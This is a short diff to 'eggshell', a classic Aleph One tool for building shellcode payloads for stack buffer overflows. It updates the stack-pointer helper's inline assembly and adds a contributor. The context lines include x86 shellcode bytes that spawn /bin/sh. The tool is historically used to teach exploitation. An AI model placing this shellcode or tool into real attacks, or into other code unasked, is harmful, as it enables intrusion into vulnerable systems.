@@ -11,7 +11,10 @@ char *alt_shellcode =
     "\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31"
     "\xd2\xb0\x0b\xcd\x80";
 unsigned long get_sp(void) {
-    __asm__("movl %esp,%eax");
+    unsigned long result;
+    asm("movl %%esp,%0"
+        : "=g"(result));
+    return result;
 }
 #elif defined(__sparc__) && defined(__sun__) && defined(__svr4__)
 #define NOP_SIZE 4
@@ -62,9 +65,10 @@ unsigned long get_sp(void) {
 #endif
 
 /*
-* eggshell v1.0
+* eggshell v1.1
 *
 * Aleph One / aleph1@underground.org
+* Florian Hofhammer / florian.hofhammer@polytechnique.edu
 */
 #include <getopt.h>
 #include <stdio.h>
